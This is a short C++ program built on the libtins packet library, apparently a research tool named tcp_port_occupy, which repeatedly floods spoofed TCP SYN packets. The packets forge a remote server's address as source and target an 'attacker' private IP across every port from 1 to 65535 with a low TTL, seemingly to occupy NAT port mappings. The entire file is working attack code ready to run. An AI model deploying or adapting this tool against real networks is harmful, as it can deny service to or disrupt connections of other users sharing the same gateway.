#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <sys/time.h>
#include <tins/tins.h>

using namespace std;
using namespace Tins;

double __get_us(struct timeval t) {
	return (t.tv_sec * 1000000 + t.tv_usec);
}


// uint16_t start_port = 32768, end_port = 65535;
// int port_search_range = 200;

uint16_t start_port = 1, end_port = 65535;
// IPv4Address dns_server_ips[3] = {IPv4Address("114.114.114.114"),IPv4Address("94.140.15.15"),IPv4Address("223.5.5.5")};

IPv4Address remote_server_ip, attacker_private_ip;
uint16_t remote_server_port;
string packet_iface;


IP tcp_pkts[70000];

bool debug = true;

int main(int argc, char** argv) {

    if (argc != 5) {
        cout << "wrong number of args ---> "
             << "(attacker_private_ip, remote_server_ip, remote_server_port, "
             << "packet_iface)" << endl;
        return 0;
        //e.g., sudo ./tcp_port_occupy 10.20.189.17 43.159.39.110 80 tun0
    }
    attacker_private_ip = IPv4Address(argv[1]);
    remote_server_ip = IPv4Address(argv[2]);
    remote_server_port = atoi(argv[3]);
    packet_iface = argv[4];
    for (int i = start_port; i <= end_port; i++) {
        tcp_pkts[i] = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, i);
        tcp_pkts[i].rfind_pdu<IP>().ttl(5);
        tcp_pkts[i].rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        // tcp_pkts[i].rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
        tcp_pkts[i].rfind_pdu<TCP>().seq(1);
    }
    PacketSender sender;
    NetworkInterface tcp_iface(packet_iface); 
    while (true) {
        cout << remote_server_ip << endl;
        struct timeval start_time, stop_time;
        gettimeofday(&start_time, NULL);
        for (int i = start_port; i <= end_port; i++) {
            sender.send(tcp_pkts[i], tcp_iface);
            usleep(10);
        }
        // sender.send(tcp_pkts[50000], tcp_iface);
        gettimeofday(&stop_time, NULL);
        if(debug) 
            printf("finished using time: %f ms\n", (__get_us(stop_time) - __get_us(start_time)) / 1000);
        sleep(2);
        // break;
    }
    
	return 0;
}
